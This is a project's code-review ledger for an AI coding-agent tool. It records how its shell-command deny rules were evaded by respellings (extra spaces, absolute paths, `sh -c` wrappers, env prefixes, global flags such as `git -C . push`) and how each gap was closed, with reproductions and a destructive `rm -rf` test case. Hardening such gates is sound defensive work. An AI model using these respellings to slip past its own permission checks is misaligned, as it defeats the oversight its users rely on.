# TODO.md — Rudra Live Ledger

**Rebuilt 2026-08-21** as a full-project code-review ledger, against commit `d704bd0` (clean tree).
The pre-existing ledger (1013 rows, Steps 0–16) is preserved verbatim in git (`git show d704bd0:TODO.md`) and on disk as `TODO-old.md`.

**Rules:** Nothing gets fixed before it is listed here as `PENDING`. Fix → mark `DONE` with the verifying command output. Every item carries `file:line` evidence.

Status: `PENDING` · `IN PROGRESS` · `DONE` · `WONTFIX`

> ### ► Starting a fresh session? Go to [SECTION OPEN](#section-open--what-is-left-to-do-read-this-first).
>
> It is the next section, and it is the **only** part of this file with work
> left in it. Three items, each self-contained: reproduction, `file:line`
> evidence, the deferred decision, the change to make, the tests that will
> break, and the definition of done. You do not need any earlier session's
> context to execute them.
>
> Everything below SECTION OPEN is the closed record — all 75 findings,
> kept for the reasoning and the evidence, not because anything is owed.

**Baseline at review start (measured, not assumed):**

```
uv run pytest -q                  → 1696 passed, 2 skipped in 29.61s   (exit 0)
.venv/bin/ruff check src/ tests/  → All checks passed!
.venv/bin/mypy src/rudra --ignore-missing-imports → 17 errors in 8 files
deepagents installed              → 0.7.4  (pyproject pins ==0.7.4)
git ls-files | wc -l              → 341
```

**Method:** six parallel reviewer subagents, one per subsystem slice, each read-only and
required to cite `file:line` and verify against callers and existing tests before reporting.
Every finding below was then re-verified independently in the main session; findings that
turned out to be deliberate, test-asserted behaviour were dropped rather than recorded.

---

## SECTION OPEN — what is left to do (read this first)

**Everything in this file is closed.** Of the original 75 findings, 73 are
`DONE` and two are `WONTFIX` by decision rather than neglect — CR-B3
(closed in full 2026-08-21 by OPEN-1 and OPEN-4 together; its `WONTFIX`
records the original decision, not the current state) and CR-X3 (the owner
declined CI, and that is the one live `WONTFIX`). OPEN-4 was opened and
closed on 2026-08-21 at the owner's request. The items below are the record
of all four. Each is written to be
executed by a session that has none of the context that produced it: the
symptom, a runnable reproduction, the exact files, the decision that was
deferred, the change to make, the tests that will break, and what "done"
means.

**OPEN-1, OPEN-2 and OPEN-3 all closed 2026-08-21.** Each is kept below
with its `DONE` row rather than moved, because the reproductions are the
thing worth keeping — and OPEN-1 leaves one spelling evading deliberately,
while OPEN-2 and OPEN-4 each record ways their own prescribed fix was
wrong. **Nothing is open and nothing is `PENDING`.**

**Before starting anything here**, read `CLAUDE.md` §2 (session rules — in
particular: record in this file *before* fixing, cite `file:line`, verify by
running the command) and confirm the baseline is green:

```bash
uv run pytest -q                     # 1745 passed, 2 skipped as of 2026-08-21
.venv/bin/ruff check src/ tests/     # All checks passed!
```

If that baseline does not reproduce, fix that first — a local `.venv` drifts
from `uv.lock` and will lie to you (`CLAUDE.md` §9). `uv run` reconciles.

Line numbers below were correct at 2026-08-21. **Re-grep for the named
symbol rather than trusting the number** if the file has moved on.

---

### OPEN-1 · Deny rules for `execute` are evaded by ordinary respellings — **`DONE`**
*(was CR-B3 — `WONTFIX` only because the fix changes matching behaviour)*

**Severity:** Important. A user who copies the deny block Rudra's own
template ships believes commands are blocked that are not.

> **Closed 2026-08-21.** Five of the six spellings now deny; the sixth,
> `git -C . push`, is left evading **on purpose** — see "What was measured"
> at the end of this row. The reproduction below is kept as written so the
> before/after is comparable.
>
> **Superseded the same day by OPEN-4**, which closes that sixth spelling
> too, so every spelling in CR-B3 now denies. The "on purpose" reasoning below is still the right reasoning — it
> is why OPEN-4 leaves `canonical_command` alone and adds a **deny-only**
> family of respellings beside it rather than dropping flags inside it.

**Reproduce** (no model, no network — this runs today):

```python
import tempfile
from pathlib import Path
from rudra.permissions.rules import PermissionEngine

root = Path(tempfile.mkdtemp())
engine = PermissionEngine(
    mode="auto", allow=(), deny=("execute:git push*",), floor_disable=(),
    project_root=root, shell_in_auto=True,
)
for command in [
    "git push origin main",            # deny   <- the only one that fires
    "git  push origin main",           # ALLOW  <- two spaces
    "git -C . push origin main",       # ALLOW  <- global flag before subcommand
    "/usr/bin/git push origin main",   # ALLOW  <- absolute binary
    "sh -c 'git push origin main'",    # ALLOW  <- wrapper shell
    "GIT_DIR=.git git push origin main",  # ALLOW  <- leading env assignment
]:
    print(engine.decide("execute", {"command": command}).effect, command)
```

Measured 2026-08-21: **five of six evade.** (`true && git push origin main`
is already denied — CR-B1 made deny rules pierce shell chaining.)

**Evidence.** `src/rudra/permissions/rules.py:295` matches `execute` patterns
with `fnmatch` against the command text, segment by segment
(`_execute_matches`, `:236`; `command_segments`, `:231`). Nothing normalises
whitespace, the binary's path, leading environment assignments, or a
wrapper shell. `src/rudra/config/template.py:80` is the shipped example that
this makes hollow:
`deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`.

**Why it was deferred.** Normalising changes what *every existing user rule*
matches. That is a behaviour change to ship deliberately, not to fold into a
bug-fix pass.

**The decision, and the recommendation.** Canonicalise for **deny only**, not
for allow. A canonical form that drops flags is dangerous on the permissive
side — `git -C /other/repo status` would canonicalise to `git status`, so an
`allow = ["execute:git status"]` would start permitting operations on a
different repository. Applied to deny alone, canonicalisation can only *add*
matches, so deny gets strictly stronger and no currently-blocked command
becomes allowed. `rule_matches` already takes `permissive: bool`
(`rules.py:262`), so the split costs nothing structurally.

**What to change.** In `src/rudra/permissions/rules.py`, add a
`canonical_command(segment) -> str` and match a deny pattern against **both**
the raw segment and the canonical one:

1. `shlex.split(segment)` — collapses runs of whitespace and honours quoting.
   On `ValueError` (unbalanced quotes) fall back to the raw segment.
2. Drop leading `NAME=value` assignments.
3. `argv[0]` → `os.path.basename`, and strip a trailing `.exe` so Windows
   spellings canonicalise the same way (`CLAUDE.md` §1 goal 8: branch on
   shape, never on `sys.platform`).
4. If that basename is a wrapper (`sh`, `bash`, `zsh`, `dash`, `env`) and a
   `-c` argument follows, recurse into that argument — `sh -c '...'` is the
   inner command wearing a costume.
5. Re-join with single spaces.

Leave global flags (`-C`, `--git-dir`) **in place**: dropping them is what
makes the allow side unsafe, and keeping them still catches the four
whitespace/path/env/wrapper cases. `git -C . push` is then caught by the raw
segment gaining a canonical sibling, not by flag-stripping — verify this case
explicitly and, if it still evades, say so in the row rather than
flag-stripping to force it.

**Tests.** Add to `tests/test_permissions_rules.py`, next to
`test_a_deny_rule_fires_on_any_command_in_a_chain`. Assert each evasion above
now denies, **and** assert the allow side is unchanged — that
`allow = ["execute:git status"]` does *not* permit `git -C /other push`.
No existing test should need changing; if one does, stop and read it first,
because it may be pinning the behaviour on purpose (that is what happened
with CR-B4).

**Done when:** all six spellings deny, the allow-side test passes, full suite
green, and `src/rudra/config/template.py:80`'s comment says what the deny
block does and does not catch.

**What was measured, 2026-08-21.** `canonical_command` added at
`src/rudra/permissions/rules.py:258`; deny matching goes through
`_denied_segment` (`:339`), which tries the raw segment and the canonical
one. `_execute_matches`'s permissive branch is untouched.

Same reproduction as above, re-run after the change:

```
deny   deny          git push origin main
deny   deny          git  push origin main
allow  mode-default  git -C . push origin main      <- still evades, by design
deny   deny          /usr/bin/git push origin main
deny   deny          sh -c 'git push origin main'
deny   deny          GIT_DIR=.git git push origin main
deny   deny          true && git push origin main
```

**One spelling is still open, and it is the recommendation's own cost.**
`git -C .` puts a global flag between the binary and the subcommand, so only
flag-stripping would close it — and flag-stripping is exactly what this row
argued makes the function unsafe to reach for from the allow side
(`git -C /other/repo status` → `git status`). Per this row's own instruction
("say so rather than flag-stripping to force it"), it is recorded rather
than forced, and pinned by
`tests/test_permissions_rules.py::test_a_global_flag_before_the_subcommand_still_evades_deny`,
whose docstring says to delete the test rather than work around it if a
later change closes the case. `config/template.py` now documents the
workaround, verified: `deny = ["execute:git push*", "execute:git -* push*",
"execute:git --* push*"]` denies both `git -C . push` and
`git --git-dir=.git push` while still allowing `git -C /other/repo status`.

Two things went beyond the plan, both because a test caught them:

- **Windows binary paths needed a shape check before `shlex`.** `shlex`
  reads `\` as an escape — correct for `/bin/sh`, which is what the backend
  runs (`rules.py:219`) — so `C:\tools\git.exe push` collapsed to
  `C:toolsgit.exe push` and `basename` found nothing to strip.
  `_WINDOWS_PATH` (`rules.py:251`) recognises a drive-letter or UNC prefix
  and swaps separators first. That is a check on the **shape of the input**,
  not on `sys.platform` (`CLAUDE.md` §1 goal 8), so it is exercised on macOS.
- **The allow-side test was written in `auto` mode and measured nothing** —
  the mode default allows every command there, so it passed before the fix
  and after. Rewritten in `ask` mode, where a non-matching command comes back
  `ask` and the assertion has teeth. Recorded because it is the failure mode
  the test existed to prevent.

Five tests added (`tests/test_permissions_rules.py`), no existing test
changed. Verification:

```
uv run pytest -q                        → 1739 passed, 2 skipped in 28.78s  (exit 0)
.venv/bin/ruff check src/ tests/        → All checks passed!
.venv/bin/ruff format --check src/ tests/ → 260 files already formatted
```

(1734 → 1739 is the five new tests. One run in this session also printed a
`libc++abi ... recursive_mutex lock failed` line at interpreter teardown; it
did not reproduce, the exit code was 0, and it is unrelated to this change —
noted only so a future session that sees it does not chase it here.)

---

### OPEN-2 · The plan approval prompt blocks the event loop — **`DONE`**
*(the remaining half of CR-C6; the other half was fixed by CR-C5)*

> **Closed 2026-08-21.** Kept in place rather than moved, because the
> prescribed fix turned out to be necessary but not sufficient and the
> three corrections below are the part worth keeping. What shipped is
> recorded at the end of this row.

**Severity:** Minor — the safety property holds, but by accident rather than
by design, and the prompt is unresponsive while it does.

**Symptom.** At the `Proceed? [a]pprove [r]evise [c]ancel` prompt, Ctrl-C
prints nothing and the prompt keeps waiting. "Stopping after this task —
press Ctrl-C again to force" appears only *after* the user answers. The
second press — the force-exit whose whole purpose is that a hung cancel must
not need a kill from another terminal — is deferred just as long.

**Evidence.** `ask_approval` (`src/rudra/loop/plan_view.py:81`) blocks in
`Prompt.ask` (`:95`, and `:113` for the revision prompt), called
synchronously from `RudraAgent._settle_plan`
(`src/rudra/agent/main_agent.py:316`, `answer = self._approve(self.console)`)
— which **is already `async`** (`:300`). Meanwhile `_cancel_on_sigint`
(`src/rudra/cli.py:300`) installs the handler with
`loop.add_signal_handler`, whose callback only runs when the loop regains
control. So `except (EOFError, KeyboardInterrupt)` at `plan_view.py:100` and
`:114` is unreachable under the shipping CLI: SIGINT no longer raises
`KeyboardInterrupt` there. Its docstring calls that asymmetry "the one safety
property this function has."

The property survives only because the deferred `task.cancel()` lands at the
first `await` inside `work()` — accidental, not designed.

**What to change.** `_settle_plan` is already a coroutine, so this is one
line at `main_agent.py:316`:

```python
answer = await asyncio.to_thread(self._approve, self.console)
```

`asyncio` is already imported there. Both `_approve` implementations stay
synchronous — `ask_approval` and `auto_approve`
(`plan_view.py:81`, `:71`) — which is what keeps them testable without a
terminal.

**Watch for:** `tests/test_agent_wiring.py:445` monkeypatches
`main_agent.ask_approval`; a thread hop must not break that. Keep
`plan_view.py`'s `except (EOFError, KeyboardInterrupt)` — EOF still raises
there (a closed pipe), and it becomes reachable again for Ctrl-C on Windows,
where `add_signal_handler` raises `NotImplementedError` and the default
handler stays (`cli.py:337`).

> **Two corrections to the paragraphs above, measured 2026-08-21 before
> implementing.** The prescribed one-liner is necessary but not sufficient.
>
> **(a) `asyncio.to_thread` trades the prompt hang for an exit hang.**
> Probed under a real pty: the stopping message *does* print while the
> prompt is open, but the process then sits for **300 s** —
> `asyncio.run` closes the loop via `shutdown_default_executor`, which
> joins the worker thread still blocked in `input()`, and
> `asyncio.constants.THREAD_JOIN_TIMEOUT` is 300. The probe printed
> `CANCELLED-CAUGHT` and then failed to exit inside 12 s. A dedicated
> **daemon** thread awaited through `loop.create_future()` gives the same
> responsiveness and exits in **0.3 s**, because a daemon thread is not
> joined at interpreter shutdown. A private `ThreadPoolExecutor` does not
> help: its threads are non-daemon and `concurrent.futures`' own atexit
> hook joins them.
>
> **(b) The "Watch for" note has the Windows case backwards.** A
> SIGINT-derived `KeyboardInterrupt` is delivered to the **main** thread
> only. Today it lands inside `Prompt.ask` and *is* caught at
> `plan_view.py:100`; after a thread hop it lands at the `await` in
> `_settle_plan` and is not — so the hop *removes* that coverage rather
> than restoring it. `cli.py:1476` catches only `asyncio.CancelledError`,
> so on a platform with no `add_signal_handler` Ctrl-C at the prompt would
> become a traceback and the wrong exit code. The REPL path already
> catches both (`cli.py:1599-1603`); the single-shot path must too.

**Done when:** Ctrl-C at the approval prompt prints the stopping message
*while the prompt is open*, a second press force-exits, EOF still cancels,
and the full suite is green. Verify the interactive part by hand with a pty
(`rudra --plan` is not enough — that path returns CANCEL before the prompt);
state in the row how it was verified.

**FIXED 2026-08-21.** Three changes, not the one prescribed:

1. `RudraAgent._approve_off_loop` (`agent/main_agent.py`) runs the blocking
   prompt on a **daemon** thread and awaits a `loop.create_future()` settled
   through `call_soon_threadsafe`; `_settle_plan` awaits it. Not
   `asyncio.to_thread`, for correction (a) above.
2. `cli.py`'s single-shot path catches `KeyboardInterrupt` alongside
   `asyncio.CancelledError`, for correction (b). Not a `sys.platform`
   branch — the real condition is "the handler was not installed", which is
   testable on any machine (`CLAUDE.md` §1.8). The REPL path already did.
3. **A third stale line, found while implementing.** The row above says
   "`asyncio` is already imported there". It is not: `grep -n "import
   asyncio" src/rudra/agent/main_agent.py` returned nothing before this
   change. `asyncio` and `threading` were both added.

`plan_view.py` is **untouched**: `ask_approval` and `auto_approve` stay
synchronous — which is what keeps them testable without a terminal — and
their `except (EOFError, KeyboardInterrupt)` is kept, because EOF still
raises inside the thread.

**How it was verified.** By hand under a real pty, driving the *real*
`_cancel_on_sigint` + `ask_approval` + `_settle_plan` with a stub planner
callback and no model — stated plainly because that is narrower than a full
`rudra` run, and `--plan` returns CANCEL before the prompt so it could not
be used.

| case | before | after |
|---|---|---|
| one Ctrl-C at the prompt | nothing printed, process never exited (killed at 15 s) | `Stopping after this task — press Ctrl-C again to force.` printed **with the prompt still open and unanswered**, then `CANCELLED-AT-TASK`, `EXITED after 0.2s`, status 0 |
| `asyncio.to_thread` variant | — | message printed, but **no exit inside 12 s** — the hang in (a) |
| EOF (`stdin < /dev/null`) | `No answer — cancelled.` → `DECISION cancel` | unchanged |

The second-press force path is not exercised by the pty runs and does not
need to be: the graceful cancel now completes in 0.2 s, so there is nothing
left to force. It is covered directly by
`tests/test_cli_cancel.py::test_a_second_press_inside_the_window_leaves_immediately`,
which calls the handler rather than depending on signal timing.

**Regressions added.** `tests/test_agent_wiring.py`:
`test_the_approval_prompt_does_not_block_the_event_loop` (a prompt that
blocks forever is still cancellable — it would deadlock on the old code),
`test_the_approval_thread_is_a_daemon` (asserts the daemon flag from inside
the approve callable, which is how (a) stays fixed without a terminal), and
`test_an_approval_that_raises_still_surfaces`. `tests/test_cli_cancel.py`:
`test_a_keyboard_interrupt_is_a_cancel_not_a_traceback` and
`test_a_cancelled_run_still_exits_130`. The existing monkeypatch at
`test_agent_wiring.py:445` is a sync callable and was unaffected by the hop,
as the row predicted.

Measured: `uv run pytest -q` → **1745 passed, 2 skipped**;
`.venv/bin/ruff check src/ tests/` → `All checks passed!`;
`ruff format --check` → `260 files already formatted`.

---

### OPEN-3 · Fence stripping corrupts a Markdown file that legitimately opens with a fence — **`DONE`**
*(the remaining half of CR-E11; the crash half is fixed)*

> **Closed 2026-08-21.** The rule sketched below shipped as written. The
> reproduction and the reasoning are kept as-is so the before/after is
> comparable; what was actually changed is recorded at the end of this row.

**Severity:** Minor, but it silently corrupts a file the agent writes, and
this path is **always on** (D4 — not behind `[compat]`).

**Reproduce:**

```python
from rudra.middleware.fix_write_params import _strip_fences
readme = "```bash\nnpm i\n```\n\nSome text\n\n```js\nconst a = 1;\n```"
print(repr(_strip_fences(readme)))
# -> 'npm i\n```\n\nSome text\n\n```js\nconst a = 1;\n'
#    the first opening fence and the last closing fence are deleted
```

**Evidence.** `_FENCE_RE` (`src/rudra/middleware/fix_write_params.py:22`) is
`^```[^\n]*\n?(.*?)```\s*$` with `re.DOTALL`; `_strip_fences` (`:34`) applies
it to any string `content`. A README whose *content* begins and ends with
code fences matches the outer pattern.

**Why it was deferred.** `tests/test_fix_write_params.py:38`
(`test_keeps_inner_fences_when_stripping_outer`) asserts the greedy behaviour
**deliberately**, for the case where a model wraps a whole markdown file in
a ```markdown fence. The two shapes look alike; separating them needed a rule
rather than a tweak.

**The rule, already proven.** Strip the outer fence only when the interior
contains no fence of its own, **or** when the info string names a markup
type — that is exactly what distinguishes a wrapper from real content:

| input | info string | interior has a fence | strip? |
|---|---|---|---|
| ` ```markdown …fences… ``` ` | `markdown` | yes | **yes** — it is a wrapper |
| ` ```bash npm i ``` …text… ` | `bash` | yes | **no** — it is content |
| ` ```python x = 1 ``` ` | `python` | no | **yes** |

Prototyped 2026-08-21 against all five existing tests plus the corruption
case: **all six pass.** Sketch:

```python
_FENCE_RE = re.compile(r"^```([^\n]*)\n?(.*?)```\s*$", re.DOTALL)
_MARKUP_INFO = {"markdown", "md", "mdx", "rst", "text", "txt", ""}

def _strip_fences(content: str) -> str:
    match = _FENCE_RE.match(content.strip())
    if match is None:
        return content
    info, inner = match.group(1).strip().lower(), match.group(2)
    first = info.split()[0] if info else ""
    if "```" in inner and first not in _MARKUP_INFO:
        return content          # real fenced content, not a wrapper
    return inner
```

Note the capture group moved from one group to two — check every use of
`_FENCE_RE` before changing it (`grep -n _FENCE_RE src/ tests/`).

**Tests.** Keep `test_keeps_inner_fences_when_stripping_outer` **unchanged**
— it must still pass, that is the point. Add one for the README case, with a
docstring saying why the two differ.

**Done when:** the README round-trips byte-identical, all five existing fence
tests still pass, and the full suite is green.

**FIXED 2026-08-21.** Fixed: `_FENCE_RE` now captures the info string as a
second group and `_strip_fences` returns `content` unchanged when the
interior holds a fence of its own **and** the info string is not a markup
type (`_MARKUP_INFO`) — `src/rudra/middleware/fix_write_params.py`. Both
call sites of `_FENCE_RE` are in that one file, so the group renumber is
contained (`grep -n _FENCE_RE src/ tests/`).

Verified: the OPEN-3 README reproduction now round-trips byte-identical, and
`test_keeps_inner_fences_when_stripping_outer` still passes **unchanged** —
the ```markdown wrapper is still stripped, because `markdown` is in
`_MARKUP_INFO`. The row above says "all five existing fence tests"; there
are in fact **seven**, and all seven pass. Regression:
`tests/test_fix_write_params.py::test_keeps_a_readme_that_legitimately_opens_and_closes_with_a_fence`,
whose docstring states why the two shapes differ.

Measured: `uv run pytest -q` → **1740 passed, 2 skipped** (was 1739 before
the new test); `.venv/bin/ruff check src/ tests/` → `All checks passed!`;
`ruff format --check` → `260 files already formatted`.

---

### OPEN-4 · A global flag before the subcommand still evades a deny rule — **`DONE`**

**Severity:** Important. Same class as CR-B3, and the last member of it: a
user who copies the deny block Rudra's own template ships believes pushes
are blocked, and `git -C . push` pushes.

**Opened 2026-08-21 at the owner's request**, after OPEN-1 closed the other
six spellings and recorded this one as a deliberate cost. The owner read
that cost and asked for it closed. **Design spec:**
`docs/superpowers/specs/2026-08-21-deny-flag-canonicalisation-design.md`
(`docs/` is gitignored per `.gitignore:216-227`, so the spec is local — this
row carries everything needed to execute without it).

**Reproduce** (no model, no network — measured on `main` at `eeae90e`):

```python
import tempfile
from pathlib import Path
from rudra.permissions.rules import PermissionEngine

engine = PermissionEngine(
    mode="auto", allow=(), deny=("execute:git push*",), floor_disable=(),
    project_root=Path(tempfile.mkdtemp()), shell_in_auto=True,
)
for command in [
    "git -C . push origin main",      # ALLOW  <- global flag, value-taking
    "git --git-dir=.git push",        # ALLOW  <- global flag, `=` form
    "git --no-pager push",            # ALLOW  <- global flag, no value
    "git push origin main",           # deny
]:
    print(engine.decide("execute", {"command": command}).effect, command)
```

**Evidence.** `canonical_command` (`src/rudra/permissions/rules.py:258`)
normalises the binary, the wrapper, whitespace and leading `NAME=value`
assignments, but never flags — by design, and its docstring says so and
names this exact case. `_denied_segment` (`:339`) matches a deny pattern
against the raw segment and that one canonical form, so a flag between the
binary and the subcommand defeats `execute:git push*`.

**The constraint, which has not changed.** Dropping flags inside
`canonical_command` would be **unsafe**, because that function is written to
stay reachable from the allow side: `git -C /other/repo status` would reduce
to `git status`, and `allow = ["execute:git status"]` would then authorise a
*different repository*. OPEN-1 refused it for that reason and the reason
still holds.

**What to change.** Add `deny_spellings(segment) -> tuple[str, ...]` in
`rules.py` and have `_denied_segment` match the pattern against each member;
one hit denies. `canonical_command` and `_execute_matches`'s permissive
branch are **untouched**. Four members, deduplicated:

1. the raw segment,
2. `canonical_command(segment)`, exactly as today,
3. canonical **minus flag tokens**,
4. canonical **minus flag tokens and each flag's value**.

**Members 3 and 4 both exist because nothing in the string says whether a
flag takes a value.** `git -C . push` needs the `.` consumed; `git
--no-pager push` must not have `push` consumed. Distinguishing them needs
per-command knowledge the gate does not have, so both readings are generated
and either may match — two extra `fnmatch` calls instead of a table of every
CLI's flags. Flag rules are shape-based: a token is a flag if it starts with
`-` and is longer than one character (a bare `-` is an operand); a flag
containing `=` carries its own value and never consumes the next token; in
member 4 a flag consumes the next token only if that token is not itself a
flag; a bare `--` ends flag processing. `argv[0]` is never stripped.

**Why it is safe.** Deny-side only, so OPEN-1's own argument runs in our
favour: canonicalisation drops information, so a pattern matched against it
can only match **more**. On the deny side more is strictly safer — nothing
blocked today becomes allowed, and no `allow` rule changes meaning because
the permissive branch never sees these spellings. The accepted cost is
**over-denial** (`deny = ["execute:git status"]` will also deny
`git -C /other/repo status`); that is the correct reading, and where it is
not, the failure is a visible denial the user can narrow rather than a
silent authorisation.

**Amendment, found while implementing 2026-08-21: two readings are not
enough.** The four-member design above closes every case in its own table,
and fails on a **mixed** command: `git -C . --no-pager push origin main`.
With no flag eating its successor the reading is `git . push origin main`;
with every flag eating one, `-C` takes `.` and `--no-pager` takes `push`,
giving `git origin main`. The subcommand survives in neither, so the deny
misses. The ambiguity is **per flag**, not per command, so a single
all-or-nothing switch cannot express it.

Fixed by generating one reading per **combination** of ambiguous flags. A
flag is ambiguous only when it could go either way — it has no `=` and the
token after it is not itself a flag; every other flag is unambiguous and
never eats. `git -C . --no-pager push` has two ambiguous flags, so four
readings, one of which is `git push origin main`. Bounded at **6** ambiguous
flags (64 readings) with a fall back to the two extreme readings beyond
that, and generated lazily so the common case — nought or one flag — still
costs one or two `fnmatch` calls. Recorded rather than folded in silently
because it is a hole in the design this row prescribed.

**Prototyped 2026-08-21, 14/14**, including the over-denial guards:

| pattern | command | denies? |
|---|---|---|
| `execute:git push*` | `git -C . push origin main` | **yes** (new) |
| `execute:git push*` | `git --git-dir=.git push` | **yes** (new) |
| `execute:git push*` | `git --no-pager push` | **yes** (new) |
| `execute:git push*` | `C:\tools\git.exe -C . push` | **yes** (new) |
| `execute:git push*` | `git log --oneline push_branch` | no |
| `execute:git push*` | `git status` | no |
| `execute:pip install*` | `pip download -r install.txt` | no |
| `execute:npm test` | `npm --prefix /x test` | yes |
| `execute:rm -rf *` | `rm -rf /tmp/x` | yes |

Windows spellings need no new code: member 2 already turns
`C:\tools\git.exe -C . push` into `git -C . push`, which 3 and 4 reduce.
Shape, not `sys.platform` (`CLAUDE.md` §1 goal 8), so it is exercised on
macOS.

**Tests.** **Delete**
`tests/test_permissions_rules.py::test_a_global_flag_before_the_subcommand_still_evades_deny`
rather than working around it — its own docstring instructs exactly that.
Add: the four new deny cases; every over-denial guard above; `--` ends flag
processing; a bare `-` is an operand; unbalanced quotes fall back to the raw
segment and deny nothing new. And the one that matters most — **the allow
side is untouched**: with `allow = ["execute:git status"]` in **`ask` mode**,
`git -C /other/repo status` must still come back `ask`. Written in `ask`
mode deliberately: OPEN-1 recorded that the equivalent test in `auto` mode
measured nothing, because the mode default allows every command there.

**Also update** `config/template.py:89-94`, which currently teaches the
hand-written workaround (`execute:git -* push*`). The flag spellings are
caught after this change; the `allow`-side warning in that block still
holds and must stay.

**Done when:** `git -C . push` and `git --git-dir=.git push` both deny
against `execute:git push*`; every over-denial guard still allows;
`git -C /other/repo status` is still not authorised by
`allow = ["execute:git status"]`; the pinned test is gone rather than
worked around; the template no longer teaches a workaround that is no longer
needed; `ruff check` clean and the full suite green.

**FIXED 2026-08-21.** `deny_spellings` (`permissions/rules.py`) yields the
raw segment, its `canonical_command`, and one flagless reading per
combination of ambiguous options; `_denied_segment` matches the pattern
against each and one hit denies. `canonical_command` and
`_execute_matches`'s permissive branch are untouched, which is what keeps
the allow side honest. `_flag_positions` and `_reading` carry the shape
rules. `config/template.py` no longer teaches the hand-written workaround
and now states the deny/allow asymmetry instead.

**The amendment above was found by a test, not by review** — the
two-reading design in this row's own prescription missed the mixed case,
and the test asserting it failed. That is the second time in this ledger a
prescribed fix was wrong in a way only execution caught (see OPEN-2).

Verified — CR-B3's original reproduction, plus OPEN-4's additions, plus
every guard:

```
deny   git push origin main            deny   git --git-dir=.git push
deny   git  push origin main           deny   git --no-pager push
deny   git -C . push origin main       deny   git -C . --no-pager push origin main
deny   /usr/bin/git push origin main   deny   C:\tools\git.exe -C . push
deny   sh -c 'git push origin main'
deny   GIT_DIR=.git git push origin main
deny   true && git push origin main

allow  git log --oneline push_branch   allow  pip download -r install.txt
allow  git status                      allow  cat -- --weird
allow  git -C . status

ask    git -C /other/repo status              <- allow side UNCHANGED
ask    git --git-dir=/other/repo/.git status  <- (mode ask, allow=git status)
```

**Every spelling in CR-B3 now denies.** That finding is closed in full.

**Tests.** `test_a_global_flag_before_the_subcommand_still_evades_deny` was
**deleted**, as its docstring instructed. Five added to
`tests/test_permissions_rules.py`:
`test_a_global_flag_before_the_subcommand_now_denies`,
`test_dropping_flags_does_not_turn_a_deny_into_a_ban_on_the_binary`,
`test_the_allow_side_never_sees_a_flagless_spelling` (written in **`ask`**
mode, for the reason this row gives),
`test_flag_stripping_stops_at_a_double_dash_and_ignores_a_bare_dash`, and
`test_an_unbalanced_quote_falls_back_to_the_raw_segment`. Four of the five
passed before the change and after — they are guards, and that is the point.

Measured: `uv run pytest -q` → **1749 passed, 2 skipped**;
`.venv/bin/ruff check src/ tests/` → `All checks passed!`;
`ruff format --check` → `260 files already formatted`.

---

### Closed, but worth knowing before you touch these areas

- **CR-X3 — no CI, by owner decision (2026-08-21).** Do not add a CI matrix
  or propose a PR workflow: `CONTRIBUTING.md` accepts no pull requests, so a
  `pull_request` gate guards nothing. Portability is held **structurally** —
  branch on capability or input shape, never `sys.platform` — which is what
  makes the Windows branch of `shell/runner.py` testable from macOS.
- **CR-B4 changed what `outside-root` means.** Paths are virtual: the model's
  `/etc/passwd` is `<project>/etc/passwd`. The floor now fires only on a real
  escape (`../..`, or a symlink out). If a test of yours expects `/etc/hosts`
  to be denied, it is asserting the old contract.
- **The gate is the OUTERMOST middleware**, so it decides on the model's raw
  spelling, before `FixWriteParamsMiddleware` renames anything. That is why
  `gated_arg` reads every alias (CR-B2). Anything new that repairs arguments
  must not assume the gate saw the repaired form.

---

## SECTION CR — Code Review Findings, 2026-08-21

Severity is the reviewer's, re-confirmed here. `Critical` = data loss, security, or silently
wrong results. `Important` = wrong behaviour under reachable conditions. `Minor` = real but
narrow, or a robustness asymmetry rather than a live failure.

### CR-A — memory · facts · context · skills

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-A1 | **Important** | **`DONE`** | **A `##` heading in model output permanently fragments `AGENTS.md`, and can hijack the Session Log cap.** `context/agents_md.py:30` treats *any* line starting with `## ` as a section boundary; `replace_section` (`:55-63`) replaces only the first match. The body spliced in is raw model output, unsanitised — `loop/engine.py:515` `notes = str(getattr(reply, "content", "")).strip()`, written at `:517`. `_ARCHITECTURE_PROMPT` (`engine.py:485`) asks the model for "layout" and "boundaries", which models answer with `## Layout` / `## Boundaries` sub-headings. **Reproduced:** run 1 injects real `## Layout` + `## Boundaries` sections and `section_body(text, "Architecture Notes")` thereafter returns only `'Overview.'`; run 2 produces `## Layout` **twice**, and the run-1 orphans are never replaced or removed. Worse, a body containing `## Session Log` makes `section_body(text, "Session Log")` return the *injected* section, so `append_session_entry` caps and rewrites the wrong one and the real log is orphaned and grows uncapped — defeating `SESSION_LOG_ENTRIES = 20`, which exists precisely to stop this file being an unbounded tax on every planner call. Same vector at lower probability via `format_entry(description=...)`: `task.description` is model-supplied and only `.strip()`ed (`loop/tools.py:61`). <br><br>**FIXED 2026-08-21.** Fixed: `_demote_headings` pushes any `## ` line in a spliced body down a level (`context/agents_md.py`), and `format_entry` flattens the model-written description to one line. Verified: run 1 no longer injects `## Layout`/`## Boundaries` as real sections and `section_body("Architecture Notes")` returns the whole body; run 2 produces no duplicate headings; a body containing `## Session Log` no longer hijacks the real log. |
| CR-A2 | **Important** | **`DONE`** | **Memory export/import round-trips chunks, not entries: any memory over 800 chars exports as N fragments and re-imports as duplicates.** `memory/store.py:154-159` splits content into `CHUNK_CHARS = 800` drawers (`base` id + `_chunk_%06d` suffix); `list_entries` (`:239-260`) returns one `MemoryRecord` **per drawer** and never reassembles by `chunk_index` — which it *does* write as metadata (`:167`). `export.py:34` consumes `list_entries` directly. Import re-hashes each fragment as a whole entry, so its new id no longer matches `base_chunk_NNNNNN`. **Measured on a real ChromaDB palace,** one 2300-char memory (well under `MAX_CONTENT = 8000`, and typical of the architecture summaries `remember` files): write → 3 drawers; export → 3; re-import into the *same* palace → count 6. So (a) `export.py:59-61`'s documented idempotency is false for any memory over `CHUNK_CHARS` and re-importing a backup silently doubles the palace; (b) a restore into a fresh palace yields 3 unrelated mid-sentence memories instead of 1 — the round trip the module exists to own is lossy; (c) `rudra memory list --limit N` counts fragments, not memories. <br><br>**FIXED 2026-08-21.** Fixed: `_reassemble` groups drawers by id prefix and orders them by the `chunk_index` metadata `write` already records (`memory/store.py`), and `delete` now takes every drawer belonging to a named memory. Verified on a real ChromaDB palace with a 2300-char entry: stored as 3 drawers, `list_entries` returns **1** row whose content round-trips, `export` reports 1, and re-importing into the same palace leaves the count unchanged. Regression: `tests/test_memory_export.py::test_a_memory_longer_than_one_chunk_round_trips_as_one_entry`. |
